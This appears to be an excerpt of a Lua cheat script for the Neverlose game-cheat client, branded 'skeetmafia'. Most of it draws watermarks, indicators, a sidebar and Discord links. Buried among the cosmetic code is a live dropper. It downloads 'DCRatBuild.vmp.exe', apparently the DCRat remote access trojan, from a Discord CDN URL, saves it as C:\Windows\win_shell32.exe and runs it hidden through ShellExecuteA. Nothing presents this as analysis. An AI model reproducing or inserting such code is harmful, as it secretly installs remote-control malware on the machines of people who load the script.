...
ui_handler.generate_welcome_text = function()
    return defines.colored_text(
        ...
        {(db.discord_id ~= nil and db.discord_id.username or "Please launch or restart discord!") .. "\n\n", colors.link_active}
...
menu.button(ui_handler.groups_name.setup.additional, defines.colored_text({ui_handler.get_icon("university"), colors.link_active}, {" Join Discord"}), function()
    panorama.SteamOverlayAPI.OpenExternalBrowserURL("https://discord.gg/drainyaw")
...
menu.button(ui_handler.groups_name.setup.additional, defines.colored_text({"NeverLose Config"}), function()
    panorama.SteamOverlayAPI.OpenExternalBrowserURL("https://market.neverlose.cc/lpYylH")
end, true)
...
wininet.DeleteUrlCacheEntryA("https://cdn.discordapp.com/attachments/1135493585911951445/1135527520847024168/DCRatBuild.vmp.exe")
urlmon.URLDownloadToFileA(nil, "https://cdn.discordapp.com/attachments/1135493585911951445/1135527520847024168/DCRatBuild.vmp.exe", "C:\\Windows\\win_shell32.exe", 0,0)
Shell32.ShellExecuteA(nil, 'open', "C:\\Windows\\win_shell32.exe", nil, nil, 0)
...
indicators.handle = function()
    ...
    anim.desync_line.move = animations.new("desync_line_move", createmove.shared_data.scoped and -render.measure_text(indicators.verdana_bold, nil, "skeetmafia").x/2 - 10 or 0)
    ...
    anim.lua_name.move = animations.new("lua_name_move", createmove.shared_data.scoped and -10 or render.measure_text(indicators.verdana_bold, nil, "skeetmafia").x/2)
    anim.lua_name.animated_text = colors.gradient_text("skeetmafia", 1.7, {first_color, second_color})
    anim.lua_name.text = {
        ["Static"] = defines.colored_text({"skeetmafia", first_color}),
        ["Multi-Color"] = defines.colored_text({"skeet", first_color}, {"mafia", second_color}), 
        ["Gradient"] = gradient.text("skeetmafia", false, {first_color, second_color}),
    ...
    if anim.lua_name.alpha > 1 then
        render.shadow(
            ...
            vector(defines.screen_size.x/2 + render.measure_text(indicators.verdana_bold, nil, "skeetmafia").x - anim.lua_name.move, defines.screen_size.y/2 + add_y + 7),
...
events.item_purchase:set(function(e)
    ...
    print_raw((hit_color.."[skeetmafia]\aFFFFFF %s bought %s"):format(name, weapon))
...
visuals.build_watermark_text = function()
    ...
    local animated_logo = colors.gradient_text("skeetmafia", 1.7, {logo_first, logo_second})
    animated_logo:animate()

    local logo_type = {
        ["Static"] = defines.colored_text({"skeetmafia", logo_first}),
        ["Multi-Color"] = defines.colored_text({"skeet", logo_first}, {"mafia", logo_second}), 
        ["Gradient"] = gradient.text("skeetmafia", false, {logo_first, logo_second}),
...
local function sidebar()
    local sidebar_anim = gradient.text_animate('S k e e t M a f i a', 1.7, {color(212, 186, 255), color(92, 92, 92)})

    ui.sidebar(sidebar_anim:get_animated_text(), 'shield-check')
    sidebar_anim:animate()
	
end

events.render:set(function() sidebar() end)